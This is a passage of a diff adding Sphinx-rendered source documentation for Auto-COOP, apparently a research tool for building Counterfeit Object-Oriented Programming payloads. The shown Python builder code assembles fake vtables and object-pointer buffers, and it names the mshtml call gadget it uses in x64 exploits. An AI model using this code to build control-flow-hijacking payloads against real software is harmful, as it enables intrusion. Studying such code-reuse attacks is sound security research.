+<div class="viewcode-block" id="LooplessBuilder.addObj"><a class="viewcode-back" href="../../../autocoop.builder.html#autocoop.builder.builder.LooplessBuilder.addObj">[docs]</a>    <span class="k">def</span> <span class="nf">addObj</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">obj</span><span class="p">,</span> <span class="n">ptrVtable</span><span class="p">):</span>
+        <span class="sd">&quot;&quot;&quot; Adds an object.</span>
+<span class="sd">        @param obj the object to add.</span>
+<span class="sd">        @param ptrVtable address of a vtable entry of the vfgadget to use.</span>
+<span class="sd">        &quot;&quot;&quot;</span>
+        <span class="c1"># do we need a new container?</span>
+        <span class="k">if</span> <span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">indexObj</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">%</span> <span class="bp">self</span><span class="o">.</span><span class="n">nObjSlots</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+            <span class="n">nextContainer</span> <span class="o">=</span> <span class="n">Object</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">arch</span><span class="p">)</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">_addObjRaw</span><span class="p">(</span><span class="n">nextContainer</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">ptrVtableRecGadget</span><span class="p">)</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">container</span> <span class="o">=</span> <span class="n">nextContainer</span>
+
+        <span class="bp">self</span><span class="o">.</span><span class="n">_addObjRaw</span><span class="p">(</span><span class="n">obj</span><span class="p">,</span> <span class="n">ptrVtable</span><span class="p">)</span></div>
+
+    <span class="k">def</span> <span class="nf">_addObjRaw</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">obj</span><span class="p">,</span> <span class="n">ptrVtable</span><span class="p">):</span>
+        <span class="c1"># get the descriptor of the next invocation slot.</span>
+        <span class="n">descriptor</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">descriptors</span><span class="p">[</span><span class="bp">self</span><span class="o">.</span><span class="n">indexObj</span> <span class="o">%</span> <span class="bp">self</span><span class="o">.</span><span class="n">nObjSlots</span><span class="p">]</span>
+        <span class="c1"># add the object to the corresponding slot in the currently active container.</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">container</span><span class="o">.</span><span class="n">mem</span><span class="o">.</span><span class="n">addUnresolvedPointer</span><span class="p">(</span><span class="n">offset</span><span class="o">=</span><span class="n">descriptor</span><span class="o">.</span><span class="n">offsetThisPtr</span><span class="p">,</span> <span class="n">targetLabel</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">nextLabelObj</span><span class="p">)</span>
+
+        <span class="n">obj</span><span class="o">.</span><span class="n">setVptr</span><span class="p">(</span><span class="n">ptrVtable</span><span class="p">,</span> <span class="n">descriptor</span><span class="o">.</span><span class="n">vindex</span><span class="p">)</span>
+        <span class="n">obj</span><span class="o">.</span><span class="n">setLabel</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">nextLabelObj</span><span class="p">)</span>
+        <span class="n">BaseBuilder</span><span class="o">.</span><span class="n">addObj</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">obj</span><span class="p">)</span>
+
+        <span class="bp">self</span><span class="o">.</span><span class="n">indexObj</span> <span class="o">+=</span> <span class="mi">1</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">nextLabelObj</span> <span class="o">+=</span> <span class="mi">1</span></div>
+
+<div class="viewcode-block" id="Builder"><a class="viewcode-back" href="../../../autocoop.builder.html#autocoop.builder.builder.Builder">[docs]</a><span class="k">class</span> <span class="nc">Builder</span><span class="p">(</span><span class="n">BaseBuilder</span><span class="p">):</span>
+    <span class="sd">&quot;&quot;&quot; DEPRECATED example builder used in x64 exploits. </span>
+<span class="sd">    Assumes that object pointer array is travsersed in loop gadget.</span>
+<span class="sd">    The object pointer array is put at the very beginning of the created buffer.</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+
+    <span class="k">def</span> <span class="nf">_createMetaBuffer</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">objReloc</span><span class="o">=</span><span class="n">Relocator</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">),</span> <span class="n">metaReloc</span><span class="o">=</span><span class="n">Relocator</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">)):</span>
+        <span class="sd">&quot;&quot;&quot; Creates buffer containing pointer to objects and vtables. </span>
+<span class="sd">        Needs to be invoked after _calcOffsets() and before _createObjBuffer().</span>
+<span class="sd">        EXPLOIT SPECIFIC: needs to be overridden for the actual call gadget. </span>
+<span class="sd">        This is an exemplary implementation for the call gadget mshtml!CExtendedTagNamespace::Passivate().</span>
+<span class="sd">        &quot;&quot;&quot;</span>
+        <span class="k">assert</span> <span class="bp">self</span><span class="o">.</span><span class="n">objOffsets</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span>
+        <span class="c1"># calculate the size of the obj-ptr array</span>
+        <span class="n">sizeObjPtrArr</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_calcSizeObjPtrArray</span><span class="p">()</span>
+
+        <span class="c1"># create buffer</span>
+        <span class="n">mem</span> <span class="o">=</span> <span class="n">Memory</span><span class="p">()</span>
+        <span class="n">currOffsetObjPtr</span> <span class="o">=</span> <span class="mi">0</span>
+        <span class="n">currOffsetVtable</span> <span class="o">=</span> <span class="n">sizeObjPtrArr</span>
+        <span class="k">for</span> <span class="n">objId</span><span class="p">,</span> <span class="n">obj</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">itObjects</span><span class="p">():</span>
+           
+            <span class="k">if</span> <span class="ow">not</span> <span class="n">obj</span><span class="o">.</span><span class="n">vtable</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
+                <span class="c1"># write fake vtable</span>
+                <span class="n">buffVtable</span> <span class="o">=</span> <span class="n">obj</span><span class="o">.</span><span class="n">vtable</span><span class="o">.</span><span class="n">getBuffer</span><span class="p">()</span>
+                <span class="n">mem</span><span class="o">.</span><span class="n">addData</span><span class="p">(</span><span class="n">currOffsetVtable</span><span class="p">,</span> <span class="n">buffVtable</span><span class="p">)</span>
+                <span class="c1"># update vptr in object</span>
+                <span class="n">obj</span><span class="o">.</span><span class="n">setVptr</span><span class="p">(</span><span class="n">metaReloc</span><span class="o">.</span><span class="n">ptr</span><span class="p">(</span><span class="n">currOffsetVtable</span><span class="p">))</span>
+                <span class="n">currOffsetVtable</span> <span class="o">+=</span> <span class="nb">len</span><span class="p">(</span><span class="n">buffVtable</span><span class="p">)</span>
+
+            <span class="c1"># calc object pointer</span>
+            <span class="n">objPtr</span> <span class="o">=</span> <span class="n">objReloc</span><span class="o">.</span><span class="n">ptr</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">objOffsets</span><span class="p">[</span><span class="n">objId</span><span class="p">])</span>
+            <span class="c1"># add object pointer to table</span>
+            <span class="n">mem</span><span class="o">.</span><span class="n">addData</span><span class="p">(</span><span class="n">currOffsetObjPtr</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">arch</span><span class="o">.</span><span class="n">packNativeInt</span><span class="p">(</span><span class="n">objPtr</span><span class="p">))</span>
+            <span class="n">currOffsetObjPtr</span> <span class="o">+=</span> <span class="bp">self</span><span class="o">.</span><span class="n">arch</span><span class="o">.</span><span class="n">sizeNativeInt</span>
+
+        <span class="k">return</span> <span class="n">mem</span><span class="o">.</span><span class="n">getBuffer</span><span class="p">()</span>
+
+    <span class="k">def</span> <span class="nf">_calcSizeMetaBuffer</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="sd">&quot;&quot;&quot; Calculates the size of the meta buffer that is created by _createMetaBuffer().</span>
+<span class="sd">        &quot;&quot;&quot;</span>
+        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">_calcSizeVtables</span><span class="p">()</span> <span class="o">+</span> <span class="bp">self</span><span class="o">.</span><span class="n">_calcSizeObjPtrArray</span><span class="p">()</span>
+
+    <span class="k">def</span> <span class="nf">_calcSizeVtables</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="c1"># accumulate the sizes of all fake vtables</span>
+        <span class="n">sizeVtables</span> <span class="o">=</span> <span class="mi">0</span>
+        <span class="k">for</span> <span class="n">objId</span><span class="p">,</span> <span class="n">obj</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">itObjects</span><span class="p">():</span>
+            <span class="k">if</span> <span class="n">obj</span><span class="o">.</span><span class="n">vtable</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span> <span class="k">continue</span>
+            <span class="n">sizeVtables</span> <span class="o">+=</span> <span class="n">obj</span><span class="o">.</span><span class="n">vtable</span><span class="o">.</span><span class="n">getSize</span><span class="p">()</span>
+
+        <span class="k">return</span> <span class="n">sizeVtables</span>
+
+    <span class="k">def</span> <span class="nf">_calcSizeObjPtrArray</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="sd">&quot;&quot;&quot; EXPLOIT SPECIFIC: needs to be overridden for the actual call gadget. </span>
+<span class="sd">        This is an exemplary implementation for the call gadget mshtml!CExtendedTagNamespace::Passivate().</span>
+<span class="sd">        &quot;&quot;&quot;</span>
+        <span class="k">return</span> <span class="nb">len</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">objects</span><span class="p">)</span> <span class="o">*</span> <span class="bp">self</span><span class="o">.</span><span class="n">arch</span><span class="o">.</span><span class="n">sizeNativeInt</span>
+        
+<div class="viewcode-block" id="Builder.finalize"><a class="viewcode-back" href="../../../autocoop.builder.html#autocoop.builder.builder.Builder.finalize">[docs]</a>    <span class="k">def</span> <span class="nf">finalize</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">maxOffset</span><span class="p">):</span>
+       
+        <span class="n">sizeMetaBuffer</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_calcSizeMetaBuffer</span><span class="p">()</span>
+        <span class="n">metaReloc</span> <span class="o">=</span> <span class="n">Relocator</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">baseBuff</span><span class="p">)</span>
+        <span class="n">objReloc</span> <span class="o">=</span> <span class="n">Relocator</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">baseBuff</span> <span class="o">+</span> <span class="n">sizeMetaBuffer</span><span class="p">)</span>
+
+        <span class="bp">self</span><span class="o">.</span><span class="n">_calcOffsets</span><span class="p">(</span><span class="n">maxOffset</span> <span class="o">-</span> <span class="n">sizeMetaBuffer</span><span class="p">)</span>
+        <span class="n">buffMeta</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_createMetaBuffer</span><span class="p">(</span><span class="n">objReloc</span><span class="o">=</span><span class="n">objReloc</span><span class="p">,</span> <span class="n">metaReloc</span><span class="o">=</span><span class="n">metaReloc</span><span class="p">)</span>
+        <span class="n">buffObj</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_createObjBuffer</span><span class="p">(</span><span class="n">objReloc</span><span class="o">=</span><span class="n">objReloc</span><span class="p">)</span>
+        
+        <span class="k">return</span> <span class="n">buffMeta</span> <span class="o">+</span> <span class="n">buffObj</span></div></div>
+</pre></div>
+
+          </div>
+          
+        </div>
+      </div>
+      <div class="sphinxsidebar" role="navigation" aria-label="main navigation">
+        <div class="sphinxsidebarwrapper">
+<h1 class="logo"><a href="../../../index.html">Auto-COOP</a></h1>
+
+
+
+
+
+
+
+
+<h3>Navigation</h3>
+<p class="caption"><span class="caption-text">Contents:</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../../../installation.html">Installation</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../../installation.html#running-auto-coop">Running Auto-COOP</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../../modules.html">Packages</a></li>
+</ul>
+
+<div class="relations">
+<h3>Related Topics</h3>
+<ul>
+  <li><a href="../../../index.html">Documentation overview</a><ul>
+  <li><a href="../../index.html">Module code</a><ul>
+  </ul></li>
+  </ul></li>
+</ul>
+</div>
+<div id="searchbox" style="display: none" role="search">
+  <h3>Quick search</h3>
+    <div class="searchformwrapper">
+    <form class="search" action="../../../search.html" method="get">
+      <input type="text" name="q" />
+      <input type="submit" value="Go" />
+      <input type="hidden" name="check_keywords" value="yes" />
+      <input type="hidden" name="area" value="default" />
+    </form>
+    </div>
+</div>
+<script type="text/javascript">$('#searchbox').show(0);</script>
+        </div>
+      </div>
+      <div class="clearer"></div>
+    </div>
+    <div class="footer">
+      &copy;2018, Richard Viehoever.
+      
+      |
+      Powered by <a href="http://sphinx-doc.org/">Sphinx 1.7.6</a>
+      &amp; <a href="https://github.com/bitprophet/alabaster">Alabaster 0.7.11</a>
+      
+    </div>
+
+    
+
+    
+  </body>
+</html>
